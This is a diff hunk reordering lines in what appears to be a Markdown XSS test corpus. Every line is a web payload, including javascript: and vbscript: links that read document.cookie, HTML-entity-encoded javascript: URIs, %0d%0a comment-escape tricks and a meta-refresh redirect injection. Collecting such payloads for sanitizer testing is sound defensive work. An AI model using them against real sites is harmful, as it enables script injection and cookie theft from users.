@@ -20,19 +20,19 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 [a](javascript:alert&#65534;(1&#41;)
 [a](javascript:confirm(1)
 [a](javascript:prompt(document.cookie))
+<javascript:prompt(document.cookie)>
+<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+[citelol]: (javascript:prompt(document.cookie))
+[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+[test](javascript://%0d%0aprompt(1))
+[test](javascript://%0d%0aprompt(1);com)
+[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
+[clickme](vbscript:alert(document.domain))
+<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
+[text](http://danlec.com " [@danlec](/danlec) ")
 [a](javascript:this;alert(1))
 [a](javascript:this;alert(1&#41;)
-[a](javascript:window.onerror=confirm;throw%201)
 [a](javascript&#58this;alert(1&#41;)
-[citelol]: (javascript:prompt(document.cookie))
-[clickme](vbscript:alert(document.domain))
-[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
-[test](javascript://%0d%0aprompt(1);com)
-[test](javascript://%0d%0aprompt(1))
-[text](http://danlec.com " [@danlec](/danlec) ")
-[XSS](.alert(1);)
+[a](javascript:window.onerror=confirm;throw%201)
 </http://<?php\><\h1\><script:script>confirm(2)
-<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
-<javascript:prompt(document.cookie)>
+[XSS](.alert(1);)
